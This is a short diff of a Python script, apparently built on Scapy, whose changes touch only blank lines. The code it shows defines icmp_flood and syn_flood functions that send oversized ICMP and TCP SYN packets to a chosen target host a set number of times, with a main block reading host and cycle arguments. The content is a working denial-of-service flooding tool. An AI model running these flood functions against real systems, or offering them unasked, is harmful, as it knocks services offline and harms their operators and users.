@@ -12,6 +12,7 @@ def argument_parser():
     print(var_args)
     return var_args
 
+
 def icmp_flood(target: str , cycle: int, payload: int = 65000):
 	ip = IP(dst=target)
 	icmp = ICMP()
@@ -19,6 +20,7 @@ def icmp_flood(target: str , cycle: int, payload: int = 65000):
 	packet = ip / icmp / raw
 	send(packet, count=cycle, verbose=0)
 	print('send_ping(): Sent ' + str(cycle) + ' pings of ' + str(payload) + ' size to ' + target)
+
 
 def syn_flood(target: str, cycle: int, dport: int,  payload: int = 65000):
 	ip = IP(dst=target)
@@ -28,10 +30,10 @@ def syn_flood(target: str, cycle: int, dport: int,  payload: int = 65000):
 	send(packet, count=cycle, verbose=0)
 	print('send_syn(): Sent ' + str(cycle) + ' packets of ' + str(payload) + ' size to ' + target)
 
+
 if __name__ == "__main__":
 	try:
 		user_args = argument_parser()
-
 		host = str(user_args["host"])
 		cycle = int(user_args["cycle"])
 
